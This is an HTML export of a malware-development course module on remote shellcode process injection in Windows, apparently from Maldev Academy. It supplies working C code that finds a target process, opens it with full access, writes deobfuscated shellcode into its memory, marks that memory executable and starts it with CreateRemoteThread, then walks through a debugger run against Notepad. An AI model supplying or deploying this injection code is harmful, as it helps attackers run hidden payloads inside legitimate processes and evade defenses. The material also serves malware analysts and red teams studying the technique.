<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>29. Process Injection - Shellcode Injection</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="462956fe-4067-4d56-baa6-65523f37bdf2" class="page sans"><header><h1 class="page-title"><a href="https://maldevacademy.com/modules/29"><strong>29. Process Injection - Shellcode Injection</strong></a></h1></header><div class="page-body"><h2 id="1f0cf31f-7cac-42d2-a93a-5a0c38ae2f0d" class=""><strong>Process Injection - Shellcode Injection</strong></h2><h3 id="b204c91e-75bf-4952-9265-5bc14aeab90b" class=""><strong>Introduction</strong></h3><p id="fce0068f-3d87-46e6-9c88-e87685a4d2bd" class="">This module will be similar to the previous DLL Injection module with minor changes. Shellcode process injection will use almost the same Windows APIs to perform the task:</p><ul id="f175ce0b-7931-4f79-8ae0-07489e93f1b8" class="bulleted-list"><li style="list-style-type:disc"><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">VirtualAllocEx</a> - Memory allocation.</li></ul><ul id="4f360d2b-9b83-4070-8235-e8c8b7b9aea9" class="bulleted-list"><li style="list-style-type:disc"><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory</a> - Write the payload to the remote process.</li></ul><ul id="8af5bd64-bcd5-4192-aa6f-8703c6560ee0" class="bulleted-list"><li style="list-style-type:disc"><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex">VirtualProtectEx</a> - Modifying memory protection.</li></ul><ul id="d30d77e1-fa10-4edb-934e-490638b06509" class="bulleted-list"><li style="list-style-type:disc"><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread">CreateRemoteThread</a> - Payload execution via a new thread.</li></ul><h3 id="9a2a3778-7e5a-4473-88cc-bcdea3ce8f07" class=""><strong>Enumerating Processes</strong></h3><p id="8b09dc6c-808c-4319-bb26-72b87a54b973" class="">Similarly to the previous module, process injection starts by enumerating the processes. The process enumeration code snippet shown below was already explained in the previous module.</p><pre id="accfd5a1-7314-47a8-a7d2-6d656a0890c4" class="code code-wrap"><code>BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {

	// According to the documentation:
	// Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32).
	// If dwSize is not initialized, Process32First fails.
	PROCESSENTRY32	Proc = {
		.dwSize = sizeof(PROCESSENTRY32)
	};

	HANDLE hSnapShot = NULL;

	// Takes a snapshot of the currently running processes
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE){
		printf(&quot;[!] CreateToolhelp32Snapshot Failed With Error : %d \n&quot;, GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first process encountered in the snapshot.
	if (!Process32First(hSnapShot, &amp;Proc)) {
		printf(&quot;[!] Process32First Failed With Error : %d \n&quot;, GetLastError());
		goto _EndOfFunction;
	}

	do {

		WCHAR LowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {
			DWORD	dwSize = lstrlenW(Proc.szExeFile);
			DWORD   i = 0;

			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

			// Converting each charachter in Proc.szExeFile to a lower case character
			// and saving it in LowerName
			if (dwSize &lt; MAX_PATH * 2) {

				for (; i &lt; dwSize; i++)
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

				LowerName[i++] = &#x27;\0&#x27;;
			}
		}

		// If the lowercase&#x27;d process name matches the process we&#x27;re looking for
		if (wcscmp(LowerName, szProcessName) == 0) {
			// Save the PID
			*dwProcessId = Proc.th32ProcessID;
			// Open a handle to the process
			*hProcess    = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				printf(&quot;[!] OpenProcess Failed With Error : %d \n&quot;, GetLastError());

			break;
		}

	// Retrieves information about the next process recorded the snapshot.
	// While a process still remains in the snapshot, continue looping
	} while (Process32Next(hSnapShot, &amp;Proc));

	// Cleanup
	_EndOfFunction:
		if (hSnapShot != NULL)
			CloseHandle(hSnapShot);
		if (*dwProcessId == NULL || *hProcess == NULL)
			return FALSE;
		return TRUE;
	}
</code></pre><h3 id="2d85f87c-c534-40bd-9dbe-ad0d7c47fd19" class=""><strong>Shellcode Injection</strong></h3><p id="3c77a1b4-181c-41a1-a212-614b6f760b40" class="">To perform shellcode injection the <code>InjectShellcodeToRemoteProcess</code> function will be used. The function takes 3 parameters:</p><ol type="1" id="e081365b-b79e-453c-9d0a-24d23d975208" class="numbered-list" start="1"><li><code>hProcess</code> - A handle to the opened remote process.</li></ol><ol type="1" id="abe5f21e-6c1e-49a8-b105-a271d310fbde" class="numbered-list" start="2"><li><code>pShellcode</code> - The deobfuscated shellcode&#x27;s base address and size. The shellcode must be in plaintext before being injected because it cannot be edited once it&#x27;s in the remote process.</li></ol><ol type="1" id="44c5a1bf-69ac-4489-b811-e6ce7963b15f" class="numbered-list" start="3"><li><code>sSizeOfShellcode</code> - The size of the shellcode.</li></ol><h3 id="a0dcfab2-3620-4387-b07f-949b51984062" class=""><strong>Shellcode Injection - Code Snippet</strong></h3><pre id="ea18ea69-ca7b-4bcc-8437-3b88cd929413" class="code code-wrap"><code>BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {

	PVOID	pShellcodeAddress              = NULL;

	SIZE_T	sNumberOfBytesWritten          = NULL;
	DWORD	dwOldProtection                = NULL;


	// Allocate memory in the remote process of size sSizeOfShellcode
	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		printf(&quot;[!] VirtualAllocEx Failed With Error : %d \n&quot;, GetLastError());
		return FALSE;
	}
	printf(&quot;[i] Allocated Memory At : 0x%p \n&quot;, pShellcodeAddress);


	printf(&quot;[#] Press &lt;Enter&gt; To Write Payload ... &quot;);
	getchar();
	// Write the shellcode in the allocated memory
	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &amp;sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf(&quot;[!] WriteProcessMemory Failed With Error : %d \n&quot;, GetLastError());
		return FALSE;
	}
	printf(&quot;[i] Successfully Written %d Bytes\n&quot;, sNumberOfBytesWritten);

	memset(pShellcode, &#x27;\0&#x27;, sSizeOfShellcode);

	// Make the memory region executable
	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
		printf(&quot;[!] VirtualProtectEx Failed With Error : %d \n&quot;, GetLastError());
		return FALSE;
	}


	printf(&quot;[#] Press &lt;Enter&gt; To Run ... &quot;);
	getchar();
	printf(&quot;[i] Executing Payload ... &quot;);
	// Launch the shellcode in a new thread
	if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
		printf(&quot;[!] CreateRemoteThread Failed With Error : %d \n&quot;, GetLastError());
		return FALSE;
	}
	printf(&quot;[+] DONE !\n&quot;);

	return TRUE;
}
</code></pre><h3 id="74db6376-f827-45af-b1f1-bca62fcb4b5f" class=""><strong>Deallocating Remote Memory</strong></h3><p id="8b7a8092-1e3e-44be-9119-266e5412b6a3" class=""><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfreeex">VirtualFreeEx</a> is a WinAPI that is used to deallocate previously allocated memory in a remote process. This function should only be called after the payload has fully finished execution otherwise it might free the payload&#x27;s content and crash the process.</p><pre id="a60d349b-cd11-4501-8376-8f6f474a9aee" class="code code-wrap"><code>BOOL VirtualFreeEx(
  [in] HANDLE hProcess,
  [in] LPVOID lpAddress,
  [in] SIZE_T dwSize,
  [in] DWORD  dwFreeType
);
</code></pre><p id="db7a3f85-a984-4bf5-8a53-6116266ef18b" class=""><code>VirtualFreeEx</code> takes the same parameter as the <code>VirtualFree</code> WinAPI with the only difference being that <code>VirtualFreeEx</code> takes an additional parameter (<code>hProcess</code>) that specifies the target process where the memory region resides.</p><h3 id="b5a062c0-b9c1-4a5e-90a2-b825f8ea48c3" class=""><strong>Debugging</strong></h3><p id="a508081e-3566-49aa-9921-7440857be1ed" class="">In this section, the implementation is debugged using the xdbg debugger to further understand what is happening under the hood.</p><p id="489efc0d-0e28-4e49-8f1f-34cd1b66b27c" class="">This walkthrough injects shellcode into a Notepad process therefore start by opening up Notepad and attaching the x64 xdbg debugger to it. The image below shows the process has PID <code>22992</code>.</p><figure id="8b2d3e3d-1d6f-47a7-be26-fff3c1fd3ab6" class="image"><a href="29%20Process%20Injection%20-%20Shellcode%20Injection%20462956fe40674d56baa665523f37bdf2/remote-shellcode-injection-1.png"><img style="width:731px" src="29%20Process%20Injection%20-%20Shellcode%20Injection%20462956fe40674d56baa665523f37bdf2/remote-shellcode-injection-1.png"/></a></figure><p id="8612a521-c75f-44bf-92e1-b5fe2b4500af" class="">Run <code>RemoteShellcodeInjection.exe</code> providing notepad.exe as an argument. The binary will start by searching for the PID of Notepad which should be the same PID shown in the xdbg debugger, which in this case is <code>22992</code>.</p><figure id="24cc8f0d-4ca1-47c6-a09b-246fcaea5455" class="image"><a href="29%20Process%20Injection%20-%20Shellcode%20Injection%20462956fe40674d56baa665523f37bdf2/remote-shellcode-injection-2.png"><img style="width:1585px" src="29%20Process%20Injection%20-%20Shellcode%20Injection%20462956fe40674d56baa665523f37bdf2/remote-shellcode-injection-2.png"/></a></figure><p id="08e65c4f-3dd5-4262-af3e-8eca27767185" class="">Next, the binary will decrypt the payload. Notice that attempting to access the memory address will result in an error. The reason this happens is because the debugger is attached to the <code>notepad.exe</code> process whereas the deobfuscation process occurs in the local process which is <code>RemoteShellcodeInjection.exe</code>.</p><figure id="88971dbd-b739-4a33-a9f3-77b4b8b25959" class="image"><a href="29%20Process%20Injection%20-%20Shellcode%20Injection%20462956fe40674d56baa665523f37bdf2/remote-shellcode-injection-3.png"><img style="width:1339px" src="29%20Process%20Injection%20-%20Shellcode%20Injection%20462956fe40674d56baa665523f37bdf2/remote-shellcode-injection-3.png"/></a></figure><p id="3fcbfb22-517c-479c-aea9-e57d1e07a3b3" class="">To view the deobfuscated payload, a new instance of xdbg must be opened and attached to the <code>RemoteShellcodeInjection.exe</code> process.</p><figure id="a84e2fc8-f4ee-4cba-b801-8cbe148f2188" class="image"><a href="29%20Process%20Injection%20-%20Shellcode%20Injection%20462956fe40674d56baa665523f37bdf2/remote-shellcode-injection-4.png"><img style="width:1371px" src="29%20Process%20Injection%20-%20Shellcode%20Injection%20462956fe40674d56baa665523f37bdf2/remote-shellcode-injection-4.png"/></a></figure><p id="25f928c3-739d-44d1-bae1-8a391f153e88" class="">Back to the Notepad debugger instance, the next step is memory allocation. The base address where the payload will be written is <code>0x0000021700230000</code>. The debugger shows that the allocated memory region was zeroed out.</p><figure id="074bb677-9e96-45aa-8ef1-b72bba35832d" class="image"><a href="29%20Process%20Injection%20-%20Shellcode%20Injection%20462956fe40674d56baa665523f37bdf2/remote-shellcode-injection-5.png"><img style="width:1461px" src="29%20Process%20Injection%20-%20Shellcode%20Injection%20462956fe40674d56baa665523f37bdf2/remote-shellcode-injection-5.png"/></a></figure><p id="6149325c-106b-4f71-86c8-5fe88b5d1b84" class="">The deobfuscated payload is then written to the allocated memory region in the remote process.</p><figure id="a215f454-c592-43d2-8abd-7e81f2f49bf4" class="image"><a href="29%20Process%20Injection%20-%20Shellcode%20Injection%20462956fe40674d56baa665523f37bdf2/remote-shellcode-injection-6.png"><img style="width:1461px" src="29%20Process%20Injection%20-%20Shellcode%20Injection%20462956fe40674d56baa665523f37bdf2/remote-shellcode-injection-6.png"/></a></figure><p id="29e3e77f-0ef3-4976-a602-20c6bf1d7e57" class="">Analyzing the local process, the payload was successfully zeroed out since it is not required anymore.</p><figure id="bf6590f5-d0c7-4f78-afbd-11fc4caa7915" class="image"><a href="29%20Process%20Injection%20-%20Shellcode%20Injection%20462956fe40674d56baa665523f37bdf2/remote-shellcode-injection-7.png"><img style="width:1439px" src="29%20Process%20Injection%20-%20Shellcode%20Injection%20462956fe40674d56baa665523f37bdf2/remote-shellcode-injection-7.png"/></a></figure><p id="9b0a39ec-cafa-41bb-9a03-8d1ab7949304" class="">Finally, the payload is executed in the remote process inside of a new thread.</p><figure id="c5bc775c-b051-4c4b-9056-a71bb7a9e7bf" class="image"><a href="29%20Process%20Injection%20-%20Shellcode%20Injection%20462956fe40674d56baa665523f37bdf2/remote-shellcode-injection-8.png"><img style="width:1839px" src="29%20Process%20Injection%20-%20Shellcode%20Injection%20462956fe40674d56baa665523f37bdf2/remote-shellcode-injection-8.png"/></a></figure></div></article></body></html>